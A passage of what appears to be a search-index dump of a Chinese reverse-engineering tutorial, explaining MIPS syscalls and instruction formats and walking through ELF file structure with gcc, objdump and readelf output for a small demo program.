\u8fd9\u662f\u5b8c\u6574\u7684\uff0c\u5176\u5b9e\u4e0a\u9762\u4f8b\u5b50\u90fd\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362 main: \u90e8\u5206\uff0c\u90fd\u80fd\u76f4\u63a5\u8fd0\u884c ) .data string1 .asciiz \"Print this.\\n\" # \u5b57\u7b26\u4e32\u53d8\u91cf\u58f0\u660e # .asciiz \u6307\u4ee4\u4f7f\u5b57\u7b26\u4e32 null \u7ec8\u6b62 .text main: li $v0, 4 # \u5c06\u9002\u5f53\u7684\u7cfb\u7edf\u8c03\u7528\u4ee3\u7801\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 $v0 \u4e2d # \u6253\u5370\u5b57\u7b26\u4e32\uff0c \u8d4b\u503c\u5bf9\u5e94\u7684\u64cd\u4f5c\u4ee3\u7801 $v0 = 4 la $a0, string1 # \u5c06\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c $a0 = address(string1) syscall # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6253\u5370\u64cd\u4f5c \u8981\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f, \u5e94\u8be5\u9000\u51fa\u7cfb\u7edf\u8c03\u7528, \u6240\u4ee5\u6700\u540e\u4e00\u884c\u4ee3\u7801\u5e94\u8be5\u662f\u8fd9\u4e2a : li $v0, 10\u3000\u3000\u3000 #\u5bf9\u7740\u4e0a\u9762\u7684\u8868, \u4e0d\u7528\u8bf4\u4e86\u5427 syscall # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8fd9\u4e00\u5207\u5427 !","title":"\u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09"},{"location":"Tutorial/Material/Reverse/#mips","text":"R\u683c\u5f0f 6 5 5 5 5 6 op rs rt rd shamt funct \u7528\u5904\uff1a \u5bc4\u5b58\u5668 - \u5bc4\u5b58\u5668 ALU \u64cd\u4f5c \u8bfb\u5199\u4e13\u7528\u5bc4\u5b58\u5668 I\u683c\u5f0f 6 5 5 16 op rs rt \u7acb\u5373\u6570\u64cd\u4f5c \u7528\u5904\uff1a \u52a0\u8f7d/\u5b58\u50a8 \u5b57\u8282\uff0c\u534a\u5b57\uff0c\u5b57\uff0c\u53cc\u5b57 \u6761\u4ef6\u5206\u652f\uff0c\u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5\u5bc4\u5b58\u5668 J\u683c\u5f0f 6 26 op \u8df3\u8f6c\u5730\u5740 \u7528\u5904\uff1a \u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5 \u9677\u9631\u548c\u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de \u5404\u5b57\u6bb5\u542b\u4e49\uff1a op : \u6307\u4ee4\u57fa\u672c\u64cd\u4f5c\uff0c\u79f0\u4e3a\u64cd\u4f5c\u7801\u3002 rs : \u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rt : \u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rd : \u5b58\u653e\u64cd\u4f5c\u7ed3\u679c\u7684\u76ee\u7684\u64cd\u4f5c\u6570\u3002 shamt : \u4f4d\u79fb\u91cf\uff1b funct : \u51fd\u6570\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u9009\u62e9 op \u64cd\u4f5c\u7684\u67d0\u4e2a\u7279\u5b9a\u53d8\u4f53\u3002 \u4f8b\uff1a add $t0,$s0,$s1 \u8868\u793a $t0=$s0+$s1 ,\u5373 16 \u53f7\u5bc4\u5b58\u5668\uff08 s0 ) \u7684\u5185\u5bb9\u548c 17 \u53f7\u5bc4\u5b58\u5668 ( s1 ) \u7684\u5185\u5bb9\u76f8\u52a0\uff0c\u7ed3\u679c\u653e\u5230 8 \u53f7\u5bc4\u5b58\u5668 ( t0 )\u3002 \u6307\u4ee4\u5404\u5b57\u6bb5\u7684\u5341\u8fdb\u5236\u8868\u793a\u4e3a\uff1a 0 16 17 8 0 32 op = 0 \u548c funct = 32 \u8868\u793a\u8fd9\u662f\u52a0\u6cd5\uff0c 16 = $s0 \u8868\u793a\u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rs ) \u5728 16 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c 17 = $s1 \u8868\u793a\u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rt ) \u5728 17 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c 8 = $t0 \u8868\u793a\u76ee\u7684\u64cd\u4f5c\u6570 ( rd ) \u5728 8 \u53f7\u5bc4\u5b58\u5668\u91cc\u3002 \u628a\u5404\u5b57\u6bb5\u5199\u6210\u4e8c\u8fdb\u5236\uff0c\u4e3a\uff1a 000000 10000 10001 01000 00000 100000 \u8fd9\u5c31\u662f\u4e0a\u8ff0\u6307\u4ee4\u7684\u673a\u5668\u7801\uff08 machine code ), \u53ef\u4ee5\u770b\u51fa\u662f\u5f88\u6709\u89c4\u5219\u6027\u7684\u3002","title":"\u8865\u5145 : MIPS \u6307\u4ee4\u683c\u5f0f"},{"location":"Tutorial/Material/Reverse/#mips_1","text":"lb/lh/lw : \u4ece\u5b58\u50a8\u5668\u4e2d\u8bfb\u53d6\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u5230\u5bc4\u5b58\u5668\u4e2d. \u5982 lb $1, 0($2) sb/sh/sw : \u628a\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u4ece\u5bc4\u5b58\u5668\u5b58\u50a8\u5230\u5b58\u50a8\u5668\u4e2d. \u5982 sb $1, 0($2) add/addu : \u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u52a0 add $1,$2,$3($1=$2+$3) ; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0 addi/addiu : \u628a\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u52a0\u4e0a\u4e00\u4e2a\u7acb\u5373\u6570 add $1,$2,#3($1=$2+3) ; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0 sub/subu \uff1a\u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u51cf div/divu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u9664 mul/mulu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u4e58 and/andi : \u4e0e\u8fd0\u7b97\uff0c\u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u76f8\u4e0e and $1,$2,$3($1=$2 & $3) ;i\u4e3a\u7acb\u5373\u6570\u3002 or/ori : \u6216\u8fd0\u7b97\u3002 xor/xori : \u5f02\u6216\u8fd0\u7b97\u3002 beq/beqz/benz/bne : \u6761\u4ef6\u8f6c\u79fb eq \u76f8\u7b49\uff0cz \u96f6\uff0cne \u4e0d\u7b49 j/jr/jal/jalr : j \u76f4\u63a5\u8df3\u8f6c\uff1bjr \u4f7f\u7528\u5bc4\u5b58\u5668\u8df3\u8f6c lui : \u628a\u4e00\u4e2a 16 \u4f4d\u7684\u7acb\u5373\u6570\u586b\u5165\u5230\u5bc4\u5b58\u5668\u7684\u9ad8 16 \u4f4d\uff0c\u4f4e 16 \u4f4d\u8865\u96f6 sll/srl : \u903b\u8f91 \u5de6\u79fb / \u53f3\u79fb sll $1,$2,#2 slt/slti/sltui : \u5982\u679c $2 \u7684\u503c\u5c0f\u4e8e $3 \uff0c\u90a3\u4e48\u8bbe\u7f6e $1 \u7684\u503c\u4e3a 1,\u5426\u5219\u8bbe\u7f6e $1 \u7684\u503c\u4e3a 0 slt $1,$2,$3 mov/movz/movn : \u590d\u5236\uff0cn \u4e3a\u8d1f\uff0cz \u4e3a\u96f6 mov $1,$2; movz $1,$2,$3 ( $3 \u4e3a\u96f6\u5219\u590d\u5236 $2 \u5230 $1 ) trap : \u6839\u636e\u5730\u5740\u5411\u91cf\u8f6c\u5165\u7ba1\u6001 eret : \u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de\u5230\u7528\u6237\u6001","title":"\u8865\u5145 : MIPS \u5e38\u7528\u6307\u4ee4\u96c6"},{"location":"Tutorial/Material/Reverse/#linux-elf","text":"\u4e00\u4e2a\u5b9e\u4f8b elfdemo.o ELF \u6587\u4ef6\u7ed3\u6784 \u53c2\u8003\u8d44\u6599","title":"Linux ELF"},{"location":"Tutorial/Material/Reverse/#_25","text":"\u5728 1.5.1\u8282 C\u8bed\u8a00\u57fa\u7840 \u4e2d\u6211\u4eec\u770b\u5230\u4e86\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5168\u8fc7\u7a0b\uff0c\u73b0\u5728\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\u3002 #include<stdio.h> int global_init_var = 10; int global_uninit_var; void func(int sum) { printf(\"%d\\n\", sum); } void main(void) { static int local_static_init_var = 20; static int local_static_uninit_var; int local_init_val = 30; int local_uninit_var; func(global_init_var + local_init_val + local_static_init_var ); } \u7136\u540e\u5206\u522b\u6267\u884c\u4e0b\u5217\u547d\u4ee4\u751f\u6210\u4e09\u4e2a\u6587\u4ef6\uff1a gcc -m32 -c elfDemo.c -o elfDemo.o gcc -m32 elfDemo.c -o elfDemo.out gcc -m32 -static elfDemo.c -o elfDemo_static.out \u4f7f\u7528 ldd \u547d\u4ee4\u6253\u5370\u6240\u4f9d\u8d56\u7684\u5171\u4eab\u5e93\uff1a $ ldd elfDemo.out linux-gate.so.1 (0xf77b1000) libc.so.6 => /usr/lib32/libc.so.6 (0xf7597000) /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf77b3000) $ ldd elfDemo_static.out not a dynamic executable elfDemo_static.out \u91c7\u7528\u4e86\u9759\u6001\u94fe\u63a5\u7684\u65b9\u5f0f\u3002 \u4f7f\u7528 file \u547d\u4ee4\u67e5\u770b\u76f8\u5e94\u7684\u6587\u4ef6\u683c\u5f0f\uff1a $ file elfDemo.o elfDemo.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped $ file elfDemo.out elfDemo.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=50036015393a99344897cbf34099256c3793e172, not stripped $ file elfDemo_static.out elfDemo_static.out: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=276c839c20b4c187e4b486cf96d82a90c40f4dae, not stripped $ file -L /usr/lib32/libc.so.6 /usr/lib32/libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib32/ld-linux.so.2, BuildID[sha1]=ee88d1b2aa81f104ab5645d407e190b244203a52, for GNU/Linux 3.2.0, not stripped \u4e8e\u662f\u6211\u4eec\u5f97\u5230\u4e86 Linux \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f ELF \uff08Executable Linkable Format\uff09\u6587\u4ef6\u7684\u4e09\u79cd\u7c7b\u578b\uff1a \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable file\uff09 \u5305\u542b\u4e86\u4ee3\u7801\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u548c\u5176\u4ed6\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002 elfDemo.o \u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09 \u5305\u542b\u4e86\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u6587\u4ef6\u3002 elfDemo_static.out \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09 \u5305\u542b\u4e86\u7528\u4e8e\u94fe\u63a5\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u5206\u4e24\u79cd\u60c5\u51b5\u3002\u4e00\u79cd\u662f\u94fe\u63a5\u5668\u5c06\u5176\u4e0e\u5176\u4ed6\u7684\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\uff0c\u751f\u4ea7\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u3002\u53e6\u4e00\u79cd\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u591a\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7ed3\u5408\uff0c\u4f5c\u4e3a\u8fdb\u7a0b\u6620\u50cf\u7684\u4e00\u90e8\u5206\u3002 elfDemo.out libc-2.25.so \u6b64\u65f6\u4ed6\u4eec\u7684\u7ed3\u6784\u5982\u56fe\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fd9\u4e2a\u7b80\u5316\u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5f00\u5934\u662f\u4e00\u4e2a\u201c\u6587\u4ef6\u5934\u201d\uff0c\u4e4b\u540e\u5206\u522b\u662f\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c.bss\u6bb5\u3002\u7a0b\u5e8f\u6e90\u4ee3\u7801\u7f16\u8bd1\u540e\uff0c\u6267\u884c\u8bed\u53e5\u53d8\u6210\u673a\u5668\u6307\u4ee4\uff0c\u4fdd\u5b58\u5728 .text \u6bb5\uff1b\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 .data \u6bb5\uff1b\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u5219\u653e\u5728 .bss \u6bb5\u3002 \u628a\u7a0b\u5e8f\u6307\u4ee4\u548c\u7a0b\u5e8f\u6570\u636e\u5206\u5f00\u5b58\u653e\u6709\u8bb8\u591a\u597d\u5904\uff0c\u4ece\u5b89\u5168\u7684\u89d2\u5ea6\u8bb2\uff0c\u5f53\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u540e\uff0c\u6570\u636e\u548c\u6307\u4ee4\u5206\u522b\u88ab\u6620\u5c04\u5230\u4e24\u4e2a\u865a\u62df\u533a\u57df\u3002\u7531\u4e8e\u6570\u636e\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u800c\u6307\u4ee4\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u865a\u5b58\u533a\u57df\u7684\u6743\u9650\u53ef\u4ee5\u88ab\u5206\u522b\u8bbe\u7f6e\u6210\u53ef\u8bfb\u5199\u548c\u53ea\u8bfb\uff0c\u53ef\u4ee5\u9632\u6b62\u7a0b\u5e8f\u7684\u6307\u4ee4\u88ab\u6539\u5199\u548c\u5229\u7528\u3002","title":"\u4e00\u4e2a\u5b9e\u4f8b"},{"location":"Tutorial/Material/Reverse/#elfdemoo","text":"\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u66f4\u6df1\u5165\u5730\u63a2\u7d22\u76ee\u6807\u6587\u4ef6\uff0c\u4f7f\u7528 objdump \u6765\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u7684\u5185\u90e8\u7ed3\u6784: $ objdump -h elfDemo.o elfDemo.o: file format elf32-i386 Sections: Idx Name Size VMA LMA File off Algn 0 .group 00000008 00000000 00000000 00000034 2**2 CONTENTS, READONLY, GROUP, LINK_ONCE_DISCARD 1 .text 00000078 00000000 00000000 0000003c 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 2 .data 00000008 00000000 00000000 000000b4 2**2 CONTENTS, ALLOC, LOAD, DATA 3 .bss 00000004 00000000 00000000 000000bc 2**2 ALLOC 4 .rodata 00000004 00000000 00000000 000000bc 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA 5 .text.__x86.get_pc_thunk.ax 00000004 00000000 00000000 000000c0 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 6 .comment 00000012 00000000 00000000 000000c4 2**0 CONTENTS, READONLY 7 .note.GNU-stack 00000000 00000000 00000000 000000d6 2**0 CONTENTS, READONLY 8 .eh_frame 0000007c 00000000 00000000 000000d8 2**2 CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA \u53ef\u4ee5\u770b\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86\u6700\u57fa\u672c\u7684\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c BSS \u6bb5\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u522b\u7684\u6bb5\u3002\u6ce8\u610f\u5230 .bss \u6bb5\u6ca1\u6709 CONTENTS \u5c5e\u6027\uff0c\u8868\u793a\u5b83\u5b9e\u9645\u4e0a\u5e76\u4e0d\u5b58\u5728\uff0c.bss \u6bb5\u53ea\u662f\u4e3a\u4e3a\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u9884\u7559\u4e86\u4f4d\u7f6e\u800c\u5df2\u3002","title":"elfDemo.o"},{"location":"Tutorial/Material/Reverse/#_26","text":"$ objdump -x -s -d elfDemo.o ...... Sections: Idx Name Size VMA LMA File off Algn ...... 1 .text 00000078 00000000 00000000 0000003c 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE ...... Contents of section .text: 0000 5589e553 83ec04e8 fcffffff 05010000 U..S............ 0010 0083ec08 ff75088d 90000000 005289c3 .....u.......R.. 0020 e8fcffff ff83c410 908b5dfc c9c38d4c ..........]....L 0030 240483e4 f0ff71fc 5589e551 83ec14e8 $.....q.U..Q.... 0040 fcffffff 05010000 00c745f4 1e000000 ..........E..... 0050 8b880000 00008b55 f401ca8b 80040000 .......U........ 0060 0001d083 ec0c50e8 fcffffff 83c41090 ......P......... 0070 8b4dfcc9 8d61fcc3 .M...a.. ...... Disassembly of section .text: 00000000 <func>: 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 53 push %ebx 4: 83 ec 04 sub $0x4,%esp 7: e8 fc ff ff ff call 8 <func+0x8> 8: R_386_PC32 __x86.get_pc_thunk.ax c: 05 01 00 00 00 add $0x1,%eax d: R_386_GOTPC _GLOBAL_OFFSET_TABLE_ 11: 83 ec 08 sub $0x8,%esp 14: ff 75 08 pushl 0x8(%ebp) 17: 8d 90 00 00 00 00 lea 0x0(%eax),%edx 19: R_386_GOTOFF .rodata 1d: 52 push %edx 1e: 89 c3 mov %eax,%ebx 20: e8 fc ff ff ff call 21 <func+0x21> 21: R_386_PLT32 printf 25: 83 c4 10 add $0x10,%esp 28: 90 nop 29: 8b 5d fc mov -0x4(%ebp),%ebx 2c: c9 leave 2d: c3 ret 0000002e <main>: 2e: 8d 4c 24 04 lea 0x4(%esp),%ecx 32: 83 e4 f0 and $0xfffffff0,%esp 35: ff 71 fc pushl -0x4(%ecx) 38: 55 push %ebp 39: 89 e5 mov %esp,%ebp 3b: 51 push %ecx 3c: 83 ec 14 sub $0x14,%esp 3f: e8 fc ff ff ff call 40 <main+0x12> 40: R_386_PC32 __x86.get_pc_thunk.ax 44: 05 01 00 00 00 add $0x1,%eax 45: R_386_GOTPC _GLOBAL_OFFSET_TABLE_ 49: c7 45 f4 1e 00 00 00 movl $0x1e,-0xc(%ebp) 50: 8b 88 00 00 00 00 mov 0x0(%eax),%ecx 52: R_386_GOTOFF global_init_var 56: 8b 55 f4 mov -0xc(%ebp),%edx 59: 01 ca add %ecx,%edx 5b: 8b 80 04 00 00 00 mov 0x4(%eax),%eax 5d: R_386_GOTOFF .data 61: 01 d0 add %edx,%eax 63: 83 ec 0c sub $0xc,%esp 66: 50 push %eax 67: e8 fc ff ff ff call 68 <main+0x3a> 68: R_386_PC32 func 6c: 83 c4 10 add $0x10,%esp 6f: 90 nop 70: 8b 4d fc mov -0x4(%ebp),%ecx 73: c9 leave 74: 8d 61 fc lea -0x4(%ecx),%esp 77: c3 ret Contents of section .text \u662f .text \u7684\u6570\u636e\u7684\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\uff0c\u603b\u5171 0x78 \u4e2a\u5b57\u8282\uff0c\u6700\u5de6\u8fb9\u4e00\u5217\u662f\u504f\u79fb\u91cf\uff0c\u4e2d\u95f4 4 \u5217\u662f\u5185\u5bb9\uff0c\u6700\u53f3\u8fb9\u4e00\u5217\u662f ASCII \u7801\u5f62\u5f0f\u3002\u4e0b\u9762\u7684 Disassembly of section .text \u662f\u53cd\u6c47\u7f16\u7ed3\u679c\u3002","title":"\u4ee3\u7801\u6bb5"},{"location":"Tutorial/Material/Reverse/#_27","text":"...... Sections: Idx Name Size VMA LMA File off Algn 2 .data 00000008 00000000 00000000 000000b4 2**2 CONTENTS, ALLOC, LOAD, DATA 4 .rodata 00000004 00000000 00000000 000000bc 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA ...... Contents of section .data: 0000 0a000000 14000000 ........ Contents of section .rodata: 0000 25640a00 %d.. ....... .data \u6bb5\u4fdd\u5b58\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002 elfDemo.c \u4e2d\u5171\u6709\u4e24\u4e2a\u8fd9\u6837\u7684\u53d8\u91cf\uff0c global_init_var \u548c local_static_init_var \uff0c\u6bcf\u4e2a\u53d8\u91cf 4 \u4e2a\u5b57\u8282\uff0c\u4e00\u5171 8 \u4e2a\u5b57\u8282\u3002\u7531\u4e8e\u5c0f\u7aef\u5e8f\u7684\u539f\u56e0\uff0c 0a000000 \u8868\u793a global_init_var \u503c\uff08 10 \uff09\u7684\u5341\u516d\u8fdb\u5236 0x0a \uff0c 14000000 \u8868\u793a local_static_init_var \u503c\uff08 20 \uff09\u7684\u5341\u516d\u8fdb\u5236 0x14 \u3002 .rodata \u6bb5\u4fdd\u5b58\u53ea\u8bfb\u6570\u636e\uff0c\u5305\u62ec\u53ea\u8bfb\u53d8\u91cf\u548c\u5b57\u7b26\u4e32\u5e38\u91cf\u3002 elfDemo.c \u4e2d\u8c03\u7528 printf \u7684\u65f6\u5019\uff0c\u7528\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf %d\\n \uff0c\u5b83\u662f\u4e00\u79cd\u53ea\u8bfb\u6570\u636e\uff0c\u4fdd\u5b58\u5728 .rodata \u6bb5\u4e2d\uff0c\u53ef\u4ee5\u4ece\u8f93\u51fa\u7ed3\u679c\u770b\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684 ASCII \u5f62\u5f0f\uff0c\u4ee5 \\0 \u7ed3\u5c3e\u3002","title":"\u6570\u636e\u6bb5\u548c\u53ea\u8bfb\u6570\u636e\u6bb5"},{"location":"Tutorial/Material/Reverse/#bss","text":"Sections: Idx Name Size VMA LMA File off Algn 3 .bss 00000004 00000000 00000000 000000bc 2**2 ALLOC .bss \u6bb5\u4fdd\u5b58\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002","title":"BSS\u6bb5"},{"location":"Tutorial/Material/Reverse/#elf","text":"\u5bf9\u8c61\u6587\u4ef6\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\uff08\u6784\u5efa\u7a0b\u5e8f\uff09\u548c\u7a0b\u5e8f\u6267\u884c\uff08\u8fd0\u884c\u7a0b\u5e8f\uff09\u3002ELF \u7ed3\u6784\u51e0\u76f8\u5173\u4fe1\u606f\u5728 /usr/include/elf.h \u3000\u6587\u4ef6\u4e2d\u3002 ELF \u6587\u4ef6\u5934\uff08ELF Header\uff09 \u5728\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u7684\u6700\u524d\u9762\uff0c\u5305\u542b\u4e86\u63cf\u8ff0\u6574\u4e2a\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\u3002 \u7a0b\u5e8f\u5934\u8868\uff08Program Header Table\uff09 \u662f\u53ef\u9009\u7684\uff0c\u5b83\u544a\u8bc9\u7cfb\u7edf\u600e\u6837\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u3002\u53ef\u6267\u884c\u6587\u4ef6\u5fc5\u987b\u6709\u7a0b\u5e8f\u5934\u8868\uff0c\u800c\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u3002 \u6bb5\uff08Section\uff09 \u5305\u542b\u4e86\u94fe\u63a5\u89c6\u56fe\u4e2d\u5927\u91cf\u7684\u76ee\u6807\u6587\u4ef6\u4fe1\u606f\u3002 \u6bb5\u8868\uff08Section Header Table\uff09 \u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u4e2d\u6240\u6709\u6bb5\u7684\u4fe1\u606f\u3002","title":"ELF \u6587\u4ef6\u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#32","text":"\u540d\u79f0 \u957f\u5ea6 \u5bf9\u5176 \u63cf\u8ff0 \u539f\u59cb\u7c7b\u578b Elf32_Addr 4 4 \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740 uint32_t Elf32_Half 2 2 \u65e0\u7b26\u53f7\u77ed\u6574\u578b uint16_t Elf32_Off 4 4 \u65e0\u7b26\u53f7\u504f\u79fb\u5730\u5740 uint32_t Elf32_Sword 4 4 \u6709\u7b26\u53f7\u6574\u578b int32_t Elf32_Word 4 4 \u65e0\u7b26\u53f7\u6574\u578b uint32_t","title":"32\u4f4d\u6570\u636e\u7c7b\u578b"},{"location":"Tutorial/Material/Reverse/#_28","text":"ELF \u6587\u4ef6\u5934\u5fc5\u7136\u5b58\u5728\u4e8e ELF \u6587\u4ef6\u7684\u5f00\u5934\uff0c\u8868\u660e\u8fd9\u662f\u4e00\u4e2a ELF \u6587\u4ef6\u3002\u5b9a\u4e49\u5982\u4e0b\uff1a typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; e_ident \u4fdd\u5b58\u7740 ELF \u7684\u5e7b\u6570\u548c\u5176\u4ed6\u4fe1\u606f\uff0c\u6700\u524d\u9762\u56db\u4e2a\u5b57\u8282\u662f\u5e7b\u6570\uff0c\u7528\u5b57\u7b26\u4e32\u8868\u793a\u4e3a \\177ELF \uff0c\u5176\u540e\u7684\u5b57\u8282\u5982\u679c\u662f 32 \u4f4d\u5219\u662f ELFCLASS32 (1)\uff0c\u5982\u679c\u662f 64 \u4f4d\u5219\u662f ELFCLASS64 (2)\uff0c\u518d\u5176\u540e\u7684\u5b57\u8282\u8868\u793a\u7aef\u5e8f\uff0c\u5c0f\u7aef\u5e8f\u4e3a ELFDATA2LSB (1)\uff0c\u5927\u7aef\u5e8f\u4e3a ELFDATA2LSB (2)\u3002\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5219\u8868\u793a ELF \u7684\u7248\u672c\u3002 \u73b0\u5728\u6211\u4eec\u4f7f\u7528 readelf \u547d\u4ee4\u6765\u67e5\u770b elfDome.out \u7684\u6587\u4ef6\u5934\uff1a $ readelf -h elfDemo.out ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x3e0 Start of program headers: 52 (bytes into file) Start of section headers: 6288 (bytes into file) Flags: 0x0 Size of 